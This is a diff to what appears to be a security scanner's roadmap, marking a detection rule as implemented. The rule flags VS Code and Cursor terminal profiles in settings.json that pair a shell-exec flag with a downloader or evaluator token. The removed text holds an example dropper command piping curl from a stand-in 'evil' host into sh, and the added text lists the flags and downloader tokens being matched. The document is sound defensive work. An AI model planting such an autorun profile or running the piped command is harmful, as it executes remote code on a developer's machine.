@@ -1349,27 +1349,44 @@ and lights up the most existing detection for free.
     `ContentNeedle` is deliberately substring-only and that's the
     right ceiling for the proxy hot path.
 
-27. **`settings.json` terminal-profile autorun rule** *(priority:
-    medium)* — the v2026.05.21 IOC catalog covers
-    `tasks.json:"runOn":"folderOpen"` but not the parallel VSCode
-    primitive: `terminal.integrated.profiles.<os>.<name>.args`
-    can carry a shell that opens a workspace-bound terminal and
-    immediately runs an attacker-supplied command (`bash -c
-    'curl evil | sh'`). The existing `ContentNeedle` rule kind
-    is too coarse (substring matches on `args` would false-positive
-    constantly on legitimate `bash --login` profiles). Needs a new
-    structural rule kind that parses `settings.json` (JSONC — strip
-    `//` comments and trailing commas), walks
-    `terminal.integrated.profiles.<os>` keys, and flags profiles
-    whose `args` contains a shell flag (`-c`, `/c`, `-Command`)
-    followed by a command longer than a configurable length, or
-    that references `curl|wget|iwr|Invoke-WebRequest`. Severity
-    Medium (legitimate but rare — devcontainers occasionally
-    legitimately bootstrap this way). Scope: workspace
-    `.vscode/settings.json` + `.cursor/settings.json`; user
-    settings are out of scope (out-of-tree, attribution is hazier).
-    Defer until #25/#26 land — the JSONC parser is a clean
-    standalone surface but the bundled-deps gap is a wider hole.
+27. **`settings.json` terminal-profile autorun rule** — ✅
+    implemented in catalog v2026.05.27 as
+    `editor-extension.terminal-profile-autorun-downloader`
+    (Medium severity, family `editor-extension`). New
+    `RuleKind::SettingsTerminalAutorun { path_suffixes }` variant
+    + lightweight inline JSONC normaliser
+    (`iocs::jsonc_to_json` — strips `//` line and `/* */` block
+    comments, drops trailing commas, leaves `//` inside strings
+    intact) feed `detect_terminal_autorun_downloader`. The detector
+    parses the normalised body with `serde_json`, walks every
+    top-level key starting with `terminal.integrated.profiles.`
+    (VS Code uses *flat* dotted keys, not nested objects), and for
+    each profile's `args[]` array flags the co-occurrence of:
+    - a shell-exec flag (`-c`, `/c`, `/C`, `/k`, `/K`, `-Command`,
+      `-EncodedCommand`, `-e`)
+    - **AND** a downloader / dynamic-evaluator token (`curl`,
+      `wget`, `iwr`, `Invoke-WebRequest`, `Invoke-Expression`,
+      `iex`, `eval `, `eval(`, `base64 -d`, `base64 --decode`).
+
+    Demanding the co-occurrence in the *same profile's args* is
+    what keeps false-positive rate honest — `bash --login` shells
+    legitimately pass `-c` to invoke their startup, and CI scripts
+    legitimately mention `curl` in unrelated argv contexts. Both
+    halves together is the dropper shape. Scope is hard-pinned to
+    `.vscode/settings.json` and `.cursor/settings.json` via the
+    rule's `path_suffixes`; user settings stay out of scope
+    (out-of-tree, attribution hazy). `scan_paths_in_root` was
+    extended with a structural-pass alongside the existing path-
+    only and content-needle passes; `matches_content` ignores the
+    new variant explicitly because it needs the relative path, not
+    just the basename, to apply its scope.
+
+    Honest gaps still pending: PowerShell `-EncodedCommand` base64
+    bodies aren't decoded (would require a base64 dependency in
+    sakimori-core, and the token alone is signal enough); profile
+    arrays nested under devcontainer-style `dev.containers.profiles`
+    aren't recognised (different schema). Both follow-ups when
+    real-world false negatives surface.
 
 28. **Chrome Web Store + `.crx` audit** *(priority: low)* —
     completes roadmap #20's Chrome half. Two pieces, both gated
